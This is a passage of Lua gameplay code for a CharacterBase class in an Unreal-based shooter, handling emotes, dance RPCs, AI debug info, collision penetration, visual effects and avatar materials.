  local EAttachLocation = import("EAttachLocation")
  local Location = FVector(0, 0, 0)
  if slua.isValid(self.RootComponent) and EAttachLocation and Location then
    local uAkComponent = UAkGameplayStatics.GetAkComponent(self.RootComponent, "", Location, EAttachLocation.KeepRelativeOffset)
    if slua.isValid(uAkComponent) then
      uAkComponent:Stop()
    end
  end
end

function CharacterBase:ShowEffectAfterSelfRescueSucceed()
end

function CharacterBase:ServerShowShowUIConfigUI(uiConfigName)
  print(bWriteLog and "CharacterBase:ServerShowShowUIConfigUI:" .. uiConfigName)
  if not Client then
    return
  end
  local ENetRole = import("ENetRole")
  if UIManager.UI_Config_InGame[uiConfigName] and (self:IsLocalControlorView() or self:IsLocalViewed() or self.Role == ENetRole.ROLE_AutonomousProxy) then
    UIManager.ShowUI(UIManager.UI_Config_InGame[uiConfigName])
  end
end

function CharacterBase:ClientRPC_FailedToJoinDance(Reason)
  print(bWriteLog and "[DanceTogether] CharacterBase ClientRPC_FailedToJoinDance Reason" .. tostring(Reason))
  ShowNotice(Reason)
end

function CharacterBase:ClientRPC_TryJoinDance(DanceActor, Index)
  print(bWriteLog and "[DanceTogether] CharacterBase ClientRPC_TryJoinDance Index:" .. tostring(Index))
  if not slua.isValid(DanceActor) then
    print(bWriteLog and "[DanceTogether][Warning] CharacterBase ClientRPC_TryJoinDance DanceActor is not Valid")
    return
  end
  DanceActor:ClientTryJoinDance(self.Object, Index)
end

function CharacterBase:ClientRPC_ShowEffectAfterFruitBingo(ShakingAudioPath, SurpriseAudioPath, SurpriseTipsID)
  log(bWriteLog and "CharacterBase:ClientRPC_ShowEffectAfterFruitBingo, Bingo in Interaction of Fruit!")
  if SurpriseTipsID and 0 < SurpriseTipsID then
    IngameTipsTools.BattleGeneralTip(SurpriseTipsID)
  end
  local audio_util = require("client.common.audio_util")
  if ShakingAudioPath and ShakingAudioPath ~= "" then
    audio_util.PlayAudioByActorAsync(ShakingAudioPath, self.Object)
  end
  if SurpriseAudioPath and SurpriseAudioPath ~= "" then
    audio_util.PlayAudioByActorAsync(SurpriseAudioPath, self.Object)
  end
end

function CharacterBase:ClientRPC_PlayMontageCamera(LookAtLocation, Radius, Time, CallbackName)
  print(bWriteLog and "CharacterBase:ClientRPC_PlayMontageCamera, LookAtLocation:" .. LookAtLocation:ToString() .. " Radius:" .. Radius, " Time:" .. Time .. " CallbackName:" .. CallbackName)
  local MontageCameraSubsystem = SubsystemMgr:Get("MontageCameraSubsystem")
  if MontageCameraSubsystem then
    if CallbackName and CallbackName ~= "" and self[CallbackName] and type(self[CallbackName]) == "function" then
      MontageCameraSubsystem:Play(LookAtLocation, Radius, Time, self[CallbackName])
    else
      MontageCameraSubsystem:Play(LookAtLocation, Radius, Time)
    end
  end
end

function CharacterBase:OnPlayMontageCameraCallback()
  print(bWriteLog and "CharacterBase:OnPlayMontageCameraCallback" .. self.Object)
end

function CharacterBase:ServerRPC_FailPreJoinDance(DanceActor)
  print(bWriteLog and "[DanceTogether] CharacterBase ServerRPC_FailPreJoinDance")
  if not slua.isValid(DanceActor) then
    print(bWriteLog and "[DanceTogether][Warning] CharacterBase ServerRPC_FailPreJoinDance DanceActor is not Valid")
    return
  end
  DanceActor:ServerFailPreJoinDance(self.Object)
end

function CharacterBase:CheckEmoteNeedUseReliableRPC(EmoteIndex)
  local Controller = self:GetPlayerControllerSafety()
  if slua.isValid(Controller) and Controller.PlayEmoteFeature and Controller.PlayEmoteFeature:CheckNeedReliable(EmoteIndex) then
    print(bWriteLog and "CharacterBase:CheckEmoteNeedUseReliableRPC", EmoteIndex)
    return true
  end
  return false
end

function CharacterBase:RegisteAirControlResumEvent(OldAirControl)
  self:AddControlEvent(self, "OnMovementBaseChanged", function(_, Character, NewMovementBase, OldMovementBase)
    if not slua.isValid(NewMovementBase) then
      print(bWriteLog and "CharacterBase:RegisteAirControlResumEvent NewMovementBase Is Not Valid")
      return
    end
    local CharacterMovement = self.STCharacterMovement
    if not slua.isValid(CharacterMovement) then
      print(bWriteLog and "CharacterBase:RegisteAirControlResumEvent Is Not Valid")
      return
    end
    CharacterMovement.AirControl = OldAirControl
    local bResult = self:RemoveControlEvent(self, "OnMovementBaseChanged")
    print(bWriteLog and "CharacterBase:RegisteAirControlResumEvent RemoveControlEvent ", bResult)
    print(bWriteLog and "CharacterBase:RegisteAirControlResumEvent AirControl is ", CharacterMovement.AirControl)
  end, self)
end

function CharacterBase:ReplaceGrenadeSkills()
  local SkillReplaceConfig = GamePlayTools.GetCurrentConfig("SkillReplaceConfig")
  local uSkillMgr = self:GetSkillManager()
  if slua.isValid(uSkillMgr) and SkillReplaceConfig and SkillReplaceConfig.ReplaceSkill then
    for sourceSkill, NewSkill in pairs(SkillReplaceConfig.ReplaceSkill) do
      uSkillMgr:ReplaceSkill(sourceSkill, NewSkill)
      print(bWriteLog and "CharacterBase:SkillReplaceConfig NewSkill")
    end
  end
end

function CharacterBase:GetGrenadeKillBindGunIDByPC(KillerPC, GrenadeID)
  if Client then
    print(bWriteLog and "CharacterBase:GetGrenadeKillBindGunID Not In Ds")
    return 0
  end
  if not slua.isValid(KillerPC) then
    print(bWriteLog and "CharacterBase:GetGrenadeKillBindGunID KillerPC Not Valid")
    return 0
  end
  local ExtendAttribute = require("Server.config.ExtendAttribute")
  local PlayerDataMgr = require("Server.Data.ServerPlayerDataMgr")
  local GrenadeBindInfo = PlayerDataMgr.GetPlayerProgressFromServer(KillerPC.UID, ExtendAttribute.GrenadeBindWeaponMap)
  if not GrenadeBindInfo then
    print(bWriteLog and "CharacterBase:GetGrenadeKillBindGunID GrenadeBindInfo Nil ")
    return 0
  end
  if GrenadeBindInfo[GrenadeID] ~= nil then
    return GrenadeBindInfo[GrenadeID]
  end
  print(bWriteLog and "CharacterBase:GetGrenadeKillBindGunID Not in GrenadeBindInfo")
  return 0
end

function CharacterBase:CheckIsValidXSuitBornIslandAction(EmoteID)
  local XSuitUtil = require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitUtil")
  local uPlayerController = self:GetPlayerControllerSafety()
  if not slua.isValid(uPlayerController) or not uPlayerController.CommerFeature then
    return false
  end
  local uAvatarComp2 = self:getAvatarComponent2()
  if not slua.isValid(uAvatarComp2) then
    return false
  end
  local AvatarItem = uAvatarComp2:GetEquippedItemDefineID(EAvatarSlotType.EAvatarSlotType_ClothesEquipemtSlot)
  if XSuitUtil:GetBornIslandActionByItemID(AvatarItem.TypeSpecificID, uAvatarComp2) ~= EmoteID then
    return false
  end
  local Period = XSuitUtil:GetPeriodByBattleActionID(EmoteID)
  if Period and 0 < Period then
    local UnLockLevel = XSuitUtil:GetUnLockLevelByFeature(AvatarItem.TypeSpecificID, Period, uPlayerController.CommerFeature.XSuitUnlockLevelList)
    local bValid = XSuitUtil:IsValidBornIslandAction(EmoteID, UnLockLevel)
    print(bWriteLog and "CharacterBase:CheckIsValidXSuitBornIslandAction bValid=" .. tostring(bValid) .. " EmoteID=" .. tostring(EmoteID) .. " Period=" .. tostring(Period) .. " UnLockLevel=" .. tostring(UnLockLevel))
    if not bValid then
      return false
    end
  end
  return true
end

function CharacterBase:CheckIsValidEmoteIDBP(EmoteID)
  print(bWriteLog and "CharacterBase:CheckIsValidEmoteIDBP", EmoteID)
  local IsValid = false
  local Controller = self:GetPlayerControllerSafety()
  if slua.isValid(Controller) and Controller.PlayEmoteFeature then
    IsValid = Controller.PlayEmoteFeature:CheckIsValidEmoteIDBP(EmoteID)
  end
  if not IsValid and self.CoopEmoteCharFeature then
    IsValid = self.CoopEmoteCharFeature:CheckIsValidEmoteIDBP(EmoteID)
  end
  return IsValid
end

function CharacterBase:IsCoopEmote(EmoteId, CoopPhase)
  if self.CoopEmoteCharFeature then
    return self.CoopEmoteCharFeature:IsCoopEmote(EmoteId, CoopPhase)
  end
  return false
end

function CharacterBase:ShouldCheckCoopEmote()
  if self.CoopEmoteCharFeature then
    return self.CoopEmoteCharFeature:ShouldCheckCoopEmote()
  end
  return false
end

function CharacterBase:ShouldShowCoopEmoteBtn(EmotePlayer)
  if self.CoopEmoteCharFeature then
    return self.CoopEmoteCharFeature:ShouldShowCoopEmoteBtn(EmotePlayer)
  end
  return false
end

function CharacterBase:RPC_Client_OnCoopEmotePhaseChange(CoopPhase)
  if self.CoopEmoteCharFeature then
    self.CoopEmoteCharFeature:HandleClientOnCoopEmotePhaseChange(CoopPhase)
  end
end

function CharacterBase:RPC_Server_JoinCoopEmote(EmotePlayer)
  local CasterPlayerKey = EmotePlayer.PlayerKey
  if not CasterPlayerKey then
    return
  end
  local CoopEmoteSubSystem = SubsystemMgr:Get("CoopEmoteSubSystem")
  if not CoopEmoteSubSystem:HasCaster(CasterPlayerKey) then
    print(bWriteLog and "CharacterBase:RPC_Server_JoinCoopEmote Caster not found " .. tostring(CasterPlayerKey))
    return
  end
  self.Super:RPC_Server_JoinCoopEmote(EmotePlayer)
end

function CharacterBase:ServerOnCoopEmotePhaseChange(CoopPhase)
  if self.CoopEmoteCharFeature then
    self.CoopEmoteCharFeature:HandleServerOnCoopEmotePhaseChange(CoopPhase)
  end
end

function CharacterBase:CheckInPhotoGrapherMode()
  local PhotoGrapherSubSystem = SubsystemMgr:Get("PhotoGrapherSubSystem")
  if PhotoGrapherSubSystem and PhotoGrapherSubSystem.bIsPhotoGrapherMode then
    return true
  end
  return false
end

function CharacterBase:ReportCharacterState()
  if not slua.isValid(self.Object) then
    return
  end
  local uPlayerController = self:GetPlayerControllerSafety()
  if not slua.isValid(uPlayerController) then
    return
  end
  print(bWriteLog and "CharacterBase:ReportCharacterState")
  if uPlayerController.ReportCharacterStateData then
    uPlayerController:ReportCharacterStateData()
  end
end

function CharacterBase:ParseServiceDebugInfo(BasicInfoKeys, DetailInfoKeys)
  if BasicInfoKeys == nil then
    return
  end
  print(bWriteLog and string.format("CharacterBase:ParseServiceDebugInfo ignore Info, PlayerKey=%s,self.EnsureStyle=%s", tostring(self.PlayerKey), tostring(self.EnsureStyle)))
  local StringUtil = require("common.string_util")
  local InfoMap = {}
  local SpeedStr = string.format("%.3f/%.3f", self:GetVelocity():Size(), self.CharacterMovement.MaxWalkSpeed)
  local PlayerStates = ""
  for i = 0, EPawnState.__MAX do
    if self:HasState(i) then
      PlayerStates = PlayerStates .. tostring(i) .. ","
    end
  end
  if BasicInfoKeys and BasicInfoKeys:Num() < 3 then
    local AIDebugInfoConfig = require("GameLua.Mod.BaseMod.DS.AI.AIDebugInfoConfig")
    if AIDebugInfoConfig and AIDebugInfoConfig[2] then
      for _, KeysStr in pairs(AIDebugInfoConfig[2]) do
        BasicInfoKeys:Add(KeysStr)
      end
    end
  end
  InfoMap.Level = tostring(self.EnsureLevel)
  InfoMap.Key = tostring(self:GetPlayerKey())
  InfoMap.TeamID = tostring(self.TeamID)
  InfoMap.HP = string.format("%d/%d", math.floor(self.Health), math.floor(self.HealthMax))
  InfoMap.NearDeathBreath = string.format("%.2f", self.NearDeathBreath)
  InfoMap.FreeCamera = tostring(self.SimulateViewData.FreeCamera)
  InfoMap.Speed = SpeedStr
  InfoMap.State = PlayerStates
  InfoMap.Location = self:K2_GetActorLocation():ToString()
  InfoMap.Rotation = self:K2_GetActorRotation():ToString()
  InfoMap.MLAIStyle = tostring(self.MLEnsureStyle)
  InfoMap.TeamInstantiated = tostring(self.TeamInstantiated)
  if self.TeleportID then
    InfoMap.TeleportID = tostring(self.TeleportID)
  end
  if self.TargetUID_Debug then
    InfoMap.Target = tostring(self.TargetUID_Debug)
  end
  local uPlayerController = GameplayData.GetPlayerController()
  if uPlayerController and slua.isValid(uPlayerController) and slua.isValid(self.Object) then
    local ViewTarget = uPlayerController:GetViewTarget()
    if ViewTarget and slua.isValid(ViewTarget) then
      InfoMap.Distance = string.format("%.0f", Game:GetActorDistance(self.Object, ViewTarget) / 100)
    end
  end
  if self.DebugAIInfoTable then
    for InfoKey, InfoValue in pairs(self.DebugAIInfoTable) do
      InfoMap[InfoKey] = InfoValue
    end
  end
  local bHaveEnsureStyle = false
  local DebugInfoArray = StringUtil.Split(self.BehaviorServiceDebugInfo, ";")
  local ExtraInfo = ""
  for index, InfoStr in ipairs(DebugInfoArray) do
    local InfoSplit = StringUtil.Split(InfoStr, "=")
    if not InfoSplit or not InfoSplit[2] then
      ExtraInfo = ExtraInfo .. InfoStr .. "\n"
    elseif Game:Contains(DetailInfoKeys, InfoSplit[1]) and string.find(InfoSplit[2], "=") then
      local InfoSplit2 = StringUtil.Split(InfoSplit[2], "=")
      DetailInfoKeys:Add(InfoSplit2[1])
      InfoMap[InfoSplit2[1]] = InfoSplit2[2]
    else
      InfoMap[InfoSplit[1]] = InfoSplit[2]
      if InfoSplit[1] == "EnsureStyle" then
        self.EnsureStyle = tonumber(InfoSplit[2])
        bHaveEnsureStyle = true
      end
      if bHaveEnsureStyle == false and self.EnsureStyle > 0 and InfoSplit[1] == "ResID" then
        self.EnsureStyle = 0
      end
    end
  end
  local AIType = "CommonAI"
  if self.EnsureStyle == 4 then
    AIType = "CommonAI_Advance"
  elseif self.EnsureStyle == 1 then
    AIType = "MLAI"
  elseif self.EnsureStyle == 2 then
    AIType = "MLAI_Delivery"
  elseif self.EnsureStyle == 3 then
    AIType = "MLAI_Teammate"
  elseif self.EnsureStyle == 5 then
    AIType = "MLAI_Humanoid"
  end
  InfoMap.Type = AIType
  self.ServiceDebugInfoForShow = ""
  local FinnalStr = ""
  local TempStr = ""
  for index, Keys in pairs(BasicInfoKeys) do
    local KeysArr = StringUtil.Split(Keys, ";")
    local EmptyLine = true
    for _, Key in ipairs(KeysArr) do
      if InfoMap[Key] then
        TempStr = string.format("[%s=%s]", Key, InfoMap[Key])
        EmptyLine = false
        FinnalStr = FinnalStr .. TempStr
      end
    end
    if not EmptyLine then
      FinnalStr = FinnalStr .. "\n"
    end
  end
  FinnalStr = FinnalStr .. "::"
  for _, Keys in pairs(DetailInfoKeys) do
    local KeysArr = StringUtil.Split(Keys, ";")
    local EmptyLine = true
    for _, Key in ipairs(KeysArr) do
      if InfoMap[Key] then
        TempStr = string.format("[%s=%s]", Key, InfoMap[Key])
        EmptyLine = false
        FinnalStr = FinnalStr .. TempStr
      end
    end
    if not EmptyLine then
      FinnalStr = FinnalStr .. "\n"
    end
  end
  FinnalStr = FinnalStr .. ExtraInfo
  self.ServiceDebugInfoForShow = FinnalStr
end

function CharacterBase:SetMLEnsureStyle(InMLStyle)
  local DebugLastMLEnsureStyle_DS = string.format("%d_%.1f", self.MLEnsureStyle, CGameState:GetServerWorldTimeSeconds())
  self:AddDebugAIInfoTable("LastMLAIStyle", DebugLastMLEnsureStyle_DS)
  self.MLEnsureStyle = InMLStyle
  self:DSSetCharacterIntPropertyForReplay("MLEnsureStyle", InMLStyle)
  print(bWriteLog and string.format("ASTExtraBaseCharacter::SetMLEnsureStyle:%s %d", self:GetPlayerNameSafety(), InMLStyle))
end

function CharacterBase:SetMLEnsureExtraInfo(InMLEnsureExtraInfo)
  self:AddDebugAIInfoTable("MLExtraInfo", InMLEnsureExtraInfo)
  self.MLEnsureExtraInfo = InMLEnsureExtraInfo
  self:DSSetCharacterStringPropertyForReplay("MLEnsureExtraInfo", InMLEnsureExtraInfo)
  print(bWriteLog and string.format("ASTExtraBaseCharacter::SetMLEnsureExtraInfo:%s %s", self:GetPlayerNameSafety(), InMLEnsureExtraInfo))
end

function CharacterBase:GetBodyPartOffset(nBodyPart, CurrentState, nHasWeapon, nPeekState)
  local StaticBodyOffsetData = require("GameLua.Mod.Library.GamePlay.AI.StaticBodyOffsetData")
  local OffsetData = {
    0,
    0,
    0
  }
  nHasWeapon = nHasWeapon + 1
  nPeekState = nPeekState + 1
  if StaticBodyOffsetData[CurrentState] and StaticBodyOffsetData[CurrentState][nHasWeapon] and StaticBodyOffsetData[CurrentState][nHasWeapon][nPeekState] then
    OffsetData = StaticBodyOffsetData[CurrentState][nHasWeapon][nPeekState][nBodyPart] or OffsetData
  else
    print(bWriteLog and string.format("ASTExtraBaseCharacter::GetHeadPosition StaticBodyOffsetData is nil CurrentState=%d nHasWeapon=%d nPeekState=%d", CurrentState, nHasWeapon, nPeekState))
  end
  return FVector(OffsetData[1], OffsetData[2], OffsetData[3])
end

function CharacterBase:BlueprintSetServiceDebugInfo(Info)
  if self.DebugAIInfoTable then
    for _, InfoData in pairs(self.DebugAIInfoTable) do
      Info = Info .. InfoData
    end
  end
  return Info
end

function CharacterBase:AddDebugAIInfoTable(Key, StringInfo)
  if not self.DebugAIInfoTable then
    self.DebugAIInfoTable = {}
  end
  if Client then
    if Key and StringInfo then
      self.DebugAIInfoTable[Key] = StringInfo
    end
  else
    local ServerStringInfo = string.format("%s=%s;", Key, StringInfo)
    self.DebugAIInfoTable[Key] = ServerStringInfo
  end
end

function CharacterBase:InitIceDecalQueue(MaxNum)
  self.IceDecalQueue = {}
  self.MaxIceDecalQueue = 2 < MaxNum and math.floor(MaxNum) or 2
  self.IceDecalQueuePtr = 0
  for i = 1, self.MaxIceDecalQueue do
    table.insert(self.IceDecalQueue, false)
  end
end

function CharacterBase:EnqueueIceDecal(uIceDecalActor)
  if not slua.isValid(uIceDecalActor) then
    return
  end
  if self.IceDecalQueue == nil then
    self:InitIceDecalQueue(3)
  end
  local CurInsertIdx = self.IceDecalQueuePtr + 1
  if self.IceDecalQueue[CurInsertIdx] and slua.isValid(self.IceDecalQueue[CurInsertIdx]) then
    local uOldActor = self.IceDecalQueue[CurInsertIdx]
    if slua.isValid(uOldActor) then
      uOldActor:K2_DestroyActor()
    end
  end
  self.IceDecalQueue[CurInsertIdx] = uIceDecalActor
  self.IceDecalQueuePtr = (self.IceDecalQueuePtr + 1) % self.MaxIceDecalQueue
end

function CharacterBase:BP_ResetDataOnRespawn()
  print(bWriteLog and "CharacterBase BP_ResetDataOnRespawn")
  EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_INGAME_ON_RESET_DATA_ON_RESPAWN, self.Object)
end

function CharacterBase:ToString()
  return string.format("%s(%s)", self.PlayerName, self.PlayerKey)
end

function CharacterBase:LuaTriggerEntrySkillWithID(SkillID, bEnable)
  if not self.bClientCanTriggerSkill then
    printf("LuaTriggerEntrySkillWithID PlayerKey:%u not self.bClientCanTriggerSkill", self.PlayerKey)
    return
  end
  if self.CharacterUltraHandRepFeature and not self.CharacterUltraHandRepFeature:CanUseUltraHand() then
    printf("LuaTriggerEntrySkillWithID PlayerKey:%u not CanUseUltraHand", self.PlayerKey)
    return
  end
  self:TriggerEntrySkillWithID(SkillID, bEnable)
end

function CharacterBase:SetClientCanTriggerSkill(bCanTriggerSkill)
  self.bClientCanTriggerSkill = bCanTriggerSkill
end

function CharacterBase:SetClothMeshForceLod(bEnable)
  if not self.getAvatarComponent2 then
    return
  end
  local AvatarComp = self:getAvatarComponent2()
  if slua.isValid(AvatarComp) then
    local EAvatarSlotType = import("EAvatarSlotType")
    AvatarComp:SetForceMeshLod(EAvatarSlotType.EAvatarSlotType_ClothesEquipemtSlot, bEnable)
  end
end

function CharacterBase:InitAddSpecialMoveInfo()
  print(bWriteLog and "CharacterBase:InitAddSpecialMoveInfo")
  if not CGame then
    return
  end
  local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
  local SpecialMoveConfig = GamePlayTools.GetCurrentConfig("SpecialMoveConfig")
  if not SpecialMoveConfig then
    return
  end
  for key, value in pairs(SpecialMoveConfig.SpecialMoveObjPathInfos) do
    if type(value) == "string" then
      local ObjMovementC = CGame:LoadOjectFromPath(value)
      if ObjMovementC then
        local ObjName = string.format("SpecialMoveObj_%d", key)
        local ObjMovement = CGame:NewObjectFromClass(self, ObjMovementC, ObjName)
        if ObjMovement and ObjMovement.SpecialMoveSetCharacterOwner then
          ObjMovement:SpecialMoveSetCharacterOwner(self)
          if slua.isValid(self.STCharacterMovement) then
            self.STCharacterMovement.SpecialObjes:Add(key, ObjMovement)
          end
        end
      end
    end
  end
  for key, value in pairs(SpecialMoveConfig.CustomMoveToSpecialMoveTypes) do
    if slua.isValid(self.STCharacterMovement) and type(value) == "number" then
      self.STCharacterMovement.CustomMoveModeToSpecialMoveType:Add(key, value)
    end
  end
  if SpecialMoveConfig.LuaCustomVariants then
    local ESpecialMovementTypeEnum = import("ESpecialMovementType")
    local LuaCustomMoveObj
    if slua.isValid(self.STCharacterMovement) then
      LuaCustomMoveObj = self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementTypeEnum.SPECIAL_MOVE_LuaCustom)
    end
    if LuaCustomMoveObj and LuaCustomMoveObj.RegisterChildVariants then
      LuaCustomMoveObj:RegisterChildVariants(SpecialMoveConfig.LuaCustomVariants)
    end
  end
  print(bWriteLog and "CharacterBase:InitAddSpecialMoveInfo over")
end

function CharacterBase:AddSpecialMoveInfo(SpecialMovementType, SpecialMovementObj)
  print(bWriteLog and "CharacterBase:AddSpecialMoveInfo:" .. tostring(SpecialMovementType))
  SpecialMovementObj:SpecialMoveSetCharacterOwner(self)
  if slua.isValid(self.STCharacterMovement) then
    self.STCharacterMovement.SpecialObjes:Add(SpecialMovementType, SpecialMovementObj)
  end
end

function CharacterBase:OnPlayerKeyRepExt()
  print(bWriteLog and "CharacterBase:OnPlayerKeyRepExt", self.PlayerKey)
  EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER, EVENTID_PLAYEREVENT_PLAYERKEY_CHANGE, self.Object)
end

function CharacterBase:OnMovementActivated()
end

function CharacterBase:HandleOnResolvePenetrationDelegate(bResolve, OldLoc, NewLoc)
  if bResolve then
    local Actor_C = import("/Script/Engine.Actor")
    local Character_C = import("/Script/Engine.Character")
    local ASTExtraVehicleBase_C = import("STExtraVehicleBase")
    local ASTExtraWeapon_C = import("STExtraWeapon")
    local FHitResult = import("/Script/Engine.HitResult")
    local uIgnoreActorArray = slua.Array(UEnums.EPropertyClass.Object, Actor_C)
    uIgnoreActorArray:Add(self.Object)
    local uWeapon = self:GetCurrentWeapon()
    if slua.isValid(uWeapon) then
      uIgnoreActorArray:Add(uWeapon)
    end
    local bIsPasswall = false
    local OutHits = slua.Array(UEnums.EPropertyClass.Struct, FHitResult)
    local HitResult = FHitResult()
    USTExtraBlueprintFunctionLibrary.TraceAllBlocks(OutHits, self.Object, OldLoc, NewLoc, HitResult, uIgnoreActorArray, false)
    printf(bWriteLog and "CharacterBase:HandleOnResolvePenetrationDelegate TraceAllBlocks bHasVehicle Check PlayerKey:%u OldLoc:%s uNewLoc:%s", self.PlayerKey, OldLoc:ToString(), NewLoc:ToString())
    local bHasVehicle = false
    if OutHits:Num() > 0 then
      for Index, Hit in pairs(OutHits) do
        local uHitActor = Hit.Actor
        if slua.isValid(uHitActor) then
          if not uHitActor:ActorHasTag("IgnorePassWall") and not uHitActor:ActorHasTag("PenetrationIgnorePassWall") and not Game:IsClassOf(uHitActor, Character_C) and not Game:IsClassOf(uHitActor, ASTExtraVehicleBase_C) and not Game:IsClassOf(uHitActor, ASTExtraWeapon_C) then
            bIsPasswall = true
          elseif Game:IsClassOf(uHitActor, ASTExtraVehicleBase_C) then
            bHasVehicle = true
          else
            uIgnoreActorArray:Add(uHitActor)
          end
        end
      end
    end
    if bHasVehicle then
      bIsPasswall = bIsPasswall or false
    end
    if bIsPasswall then
      local FResolvePenetrationParams = import("/Script/ShadowTrackerExtra.ResolvePenetrationParams")
      local ResolveParams = FResolvePenetrationParams()
      ResolveParams.AdjustRadius = 50
      ResolveParams.bLineTracePassWall = true
      ResolveParams.AdjustMaxHeight = 200
      local IgnoreNumIndex = uIgnoreActorArray:Num() - 1
      for i = 0, IgnoreNumIndex do
        slua.IndexReference(ResolveParams, "PassWallIgnoreActors"):Add(uIgnoreActorArray:Get(i))
      end
      self:SetActorLocationSafetyWithParams(OldLoc, ResolveParams)
      local uNewLoc = self:K2_GetActorLocation()
      printf(bWriteLog and "CharacterBase:HandleOnResolvePenetrationDelegate PlayerKey:%u uNewLoc:%s", self.PlayerKey, uNewLoc:ToString())
    end
  end
end

function CharacterBase:IsCastingSkillIDFix(InSkillID)
  if not self.GetSkillManager then
    print(bWriteLog and "CharacterBase:IsCastingSkillIDFix self.GetSkillManager is nil, return false")
    return false
  end
  local uSkillManager = self:GetSkillManager()
  if not slua.isValid(uSkillManager) then
    return false
  end
  return uSkillManager:IsCastingSkillID(InSkillID)
end

function CharacterBase:RefreshThermalImagingLocal()
  local GameplayData = require("GameLua.GameCore.Data.GameplayData")
  local uPlayerCharacter = GameplayData.GetPlayerCharacter()
  if slua.isValid(uPlayerCharacter) then
    local ESightVisionMask = import("ESightVisionMask")
    local ESightVisionType = import("ESightVisionType")
    if uPlayerCharacter:HasAnySightVision(ESightVisionMask.ThermalImagingScope) then
      local UGameplayStatics = import("GameplayStatics")
      local uGameInstance = UGameplayStatics.GetGameInstance(uPlayerCharacter)
      if slua.isValid(uGameInstance) then
        print(bWriteLog and "CharacterBase:RefreshThermalImagingLocal:", uGameInstance, uGameInstance:HasSightVision(ESightVisionType.ThermalImaging))
        uGameInstance:RefreshThermalImagingLocal(uPlayerCharacter)
      end
    end
  end
end

function CharacterBase:OnSplineMoveChanged(bEnter)
  print(bWriteLog and "CharacterBase:OnSplineMoveChanged, bEnter:" .. tostring(bEnter))
  self:HandleEnableMoveLayer(bEnter)
end

function CharacterBase:HandleEnableMoveLayer(sEnable)
  local uAnimParamsComp = self:GetAnimParamsComponent()
  if not slua.isValid(uAnimParamsComp) then
    print(bWriteLog and "CharacterBase:HandleEnableMoveLayer uAnimParamsComp = nil")
    return
  end
  local bFPP = self:GetIsFPP()
  local uCharAnimInstance = self:GetCurrentMainLogicAnimInstance(bFPP)
  if slua.isValid(uCharAnimInstance) then
    if sEnable then
      local MoveInstanceClass = uAnimParamsComp:GetCustomizableAnimBP(uCharAnimInstance.FEATURE_MoveAnimInstanceID)
      if MoveInstanceClass then
        uAnimParamsComp:ActiveAnimContainerWithInstance("AC.Locomotion", MoveInstanceClass, false)
        print(bWriteLog and "CharacterBase:HandleEnableMoveLayer OnSplineMoveChanged, Actived MoveLayer.")
      end
    else
      uAnimParamsComp:ActiveAnimContainer("AC.Locomotion", true)
      print(bWriteLog and "CharacterBase:HandleEnableMoveLayer OnSplineMoveChanged, Deactive MoveLayer, ActiveAnim Locomotion")
    end
  end
end

function CharacterBase:SpawnEmitterEffect(RelativeLocation, PSRef, AttachParent, RelativeScale)
  local KismetMathLibrary = import("KismetMathLibrary")
  local uPlayerController = self:GetPlayerControllerSafety()
  if slua.isValid(uPlayerController) then
    local ScreenAppearanceStatics = import("ScreenAppearanceStatics")
    local uScreenAppearanceActor = ScreenAppearanceStatics.GetScreenAppearanceManager(uPlayerController)
    if slua.isValid(uScreenAppearanceActor) then
      local uBloodSpotProvider, sProviderName
      if self.BloodSpot_Red == PSRef then
        sProviderName = "BloodSpot_Red"
      else
        sProviderName = "BloodSpot_Green"
      end
      uBloodSpotProvider = uScreenAppearanceActor:PlayDefaultScreenAppearance(uPlayerController, sProviderName, nil)
      if slua.isValid(uBloodSpotProvider) then
        do
          local uTransform = KismetMathLibrary.MakeTransform(RelativeLocation, FRotator(0.0, 0.0, 90.0), RelativeScale)
          uBloodSpotProvider:UpdateRelativeTransform(uTransform)
          self.BloodScale = RelativeScale
          local EventDelegate = uBloodSpotProvider.AsyncLoadParticleComponentDone
          if slua.isValid(EventDelegate) and EventDelegate.Add then
            self._BloodSpotDelegateHandles = self._BloodSpotDelegateHandles or {}
            do
              local OldInfo = self._BloodSpotDelegateHandles[sProviderName]
              if OldInfo and OldInfo.Handle then
                local OldProvider = OldInfo.Provider
                if slua.isValid(OldProvider) then
                  local OldEventDelegate = OldProvider.AsyncLoadParticleComponentDone
                  if slua.isValid(OldEventDelegate) and OldEventDelegate.Remove then
                    OldEventDelegate:Remove(OldInfo.Handle)
                  else
                    slua.removeDelegate(OldInfo.Handle)
                  end
                else
                  slua.removeDelegate(OldInfo.Handle)
                end
                self._BloodSpotDelegateHandles[sProviderName] = nil
              end
              local DelegateHandle
              DelegateHandle = EventDelegate:Add(function(LoadedParticle)
                if DelegateHandle then
                  if slua.isValid(EventDelegate) and EventDelegate.Remove then
                    EventDelegate:Remove(DelegateHandle)
                  end
                  if self._BloodSpotDelegateHandles then
                    local CurInfo = self._BloodSpotDelegateHandles[sProviderName]
                    if CurInfo and CurInfo.Handle == DelegateHandle then
                      self._BloodSpotDelegateHandles[sProviderName] = nil
                    end
                  end
                  DelegateHandle = nil
                end
                if slua.isValid(LoadedParticle) and slua.isValid(self.Object) then
                  self:ChangeParticleEffect(LoadedParticle, self.BloodScale)
                end
              end)
              self._BloodSpotDelegateHandles[sProviderName] = {Provider = uBloodSpotProvider, Handle = DelegateHandle}
            end
          end
        end
      end
    end
  end
end

function CharacterBase:ChangeAllAvatarMaterialToFeatureMaterial(material)
  local uAvatarComp2 = self:getAvatarComponent2()
  if slua.isValid(uAvatarComp2) then
    uAvatarComp2:ChangeAllMeshToFeatureMaterial(material)
  end
  local WeaponManager = self:GetWeaponManager()
  if slua.isValid(WeaponManager) then
    WeaponManager:ChangeAllMeshToFeatureMaterial(material)
  end
end

function CharacterBase:ClearAllAvatarFeatureMaterial()
  if self.getAvatarComponent2 then
    local uAvatarComp2 = self:getAvatarComponent2()
    if slua.isValid(uAvatarComp2) then
      uAvatarComp2:ClearAllFeatureMaterial()
    end
  end
  if self.GetWeaponManager then
    local WeaponManager = self:GetWeaponManager()
    if slua.isValid(WeaponManager) then
      WeaponManager:ClearAllFeatureMaterial()
    end
  end
end

function CharacterBase:CheckParachuteLandShouldUseSkill()
  local UKismetSystemLibrary = import("KismetSystemLibrary")
  local uPawnFor = self:GetActorForwardVector()
  local uPawnLoc = self:K2_GetActorLocation()
